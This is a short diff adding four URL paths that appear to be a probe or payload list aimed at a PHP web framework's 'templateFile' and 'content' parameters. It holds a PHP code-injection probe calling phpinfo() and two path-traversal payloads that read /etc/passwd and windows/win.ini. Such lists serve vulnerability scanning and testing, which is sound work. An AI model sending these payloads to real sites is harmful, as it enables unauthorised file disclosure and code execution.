@@ -1,0 +1,4 @@
+/?a=display&templateFile=README.md
+/index.php?g=g&m=Door&a=index&content=<?php%20phpinfo();
+/?a=display&templateFile=../../../../../../../../../../../../../../../../etc/passwd
+/?a=display&templateFile=../../../../../../../../../../../../../../../../windows/win.ini
